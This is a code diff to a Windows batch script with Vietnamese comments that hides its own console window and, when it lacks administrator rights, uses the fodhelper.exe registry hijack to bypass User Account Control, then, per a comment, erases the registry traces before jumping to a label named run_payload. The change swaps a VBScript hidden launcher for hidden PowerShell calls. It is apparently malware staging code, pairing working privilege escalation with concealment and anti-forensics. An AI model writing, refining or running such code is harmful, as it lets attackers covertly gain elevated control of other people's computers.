@@ -5,9 +5,8 @@ setlocal ENABLEDELAYEDEXPANSION
 
 :: Bùa ẩn thân: Trốn khỏi mắt thường bằng cách chạy ẩn toàn bộ cửa sổ dòng lệnh đen xì của Windows
 if "%~1"=="h" goto begin
-if exist "%temp%\h.vbs" del "%temp%\h.vbs"
-echo CreateObject("Wscript.Shell").Run """" ^& WScript.Arguments(0) ^& """" ^& " h", 0, False > "%temp%\h.vbs"
-wscript "%temp%\h.vbs" "%~dpnx0"
+set "SCRIPT_PATH=%~dpnx0"
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath $env:SCRIPT_PATH -ArgumentList 'h' -WindowStyle Hidden"
 exit
 
 :begin
@@ -17,7 +16,7 @@ if %errorLevel% == 0 (
     goto :run_payload
 ) else (
     reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
-    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c \"\"%~dpnx0\" h\"" /f >nul 2>&1
+    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "powershell -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath '%~dpnx0' -ArgumentList 'h' -WindowStyle Hidden\"" /f >nul 2>&1
     fodhelper.exe
     
     :: Chờ 2 giây để thuật thôi miên có tác dụng rồi lập tức xóa sạch vết chân Registry
